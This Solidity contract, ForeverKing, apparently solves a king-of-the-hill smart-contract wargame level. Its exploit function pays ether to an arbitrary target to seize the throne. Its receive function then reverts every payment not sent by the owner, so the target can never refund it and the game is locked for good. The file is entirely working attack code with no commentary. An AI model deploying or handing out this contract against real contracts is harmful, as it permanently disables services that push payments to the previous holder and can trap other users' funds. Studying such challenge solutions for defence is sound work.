// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForeverKing {
    address owner;

    constructor(){
        owner = msg.sender;
    }

    function exploit(address target) external payable {
        require(msg.value >= target.balance, "not enough!");
        (bool sent, ) = target.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable{
        if(msg.sender != owner) revert();
    }
}